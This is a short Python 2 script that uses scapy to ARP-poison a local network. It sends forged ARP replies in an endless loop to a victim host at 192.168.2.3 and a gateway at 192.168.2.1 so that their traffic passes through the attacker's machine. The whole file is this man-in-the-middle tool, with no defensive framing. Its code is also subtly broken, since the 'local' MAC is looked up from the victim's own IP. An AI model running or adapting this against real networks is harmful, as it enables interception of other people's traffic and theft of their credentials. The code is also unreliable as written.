#!/usr/bin/env python

from scapy.all import *


def arpPoison(victimIP, targetIP, victimMAC, targetMAC, localMAC):
	# Send the packet to the Client Target (Victim). 
	victimARP = Ether(dst = victimMAC, src = targetMAC)/ARP(op = 2, hwsrc = localMAC, psrc = targetIP)

	#Send the ARP Response to the Gateway.
	targetARP = Ether(dst = targetMAC, src = victimMAC)/ARP(op = 2, hwsrc = localMAC, psrc = victimIP)

	print "\nForwarding target: %s to  MAC %s"%(targetIP, localMAC)
	print "Forwarding target: %s to MAC %s"%(victimIP, localMAC)

	while True:
		sendp(victimARP, verbose = 0, inter = 1)
		sendp(targetARP, verbose = 0, inter = 1)



victimIP = "192.168.2.3"
targetIP = "192.168.2.1"


victimMAC = getmacbyip(victimIP)
targetMAC = getmacbyip(targetIP)

localMAC = getmacbyip("192.168.2.3")

arpPoison(victimIP, targetIP, victimMAC, targetMAC, localMAC)
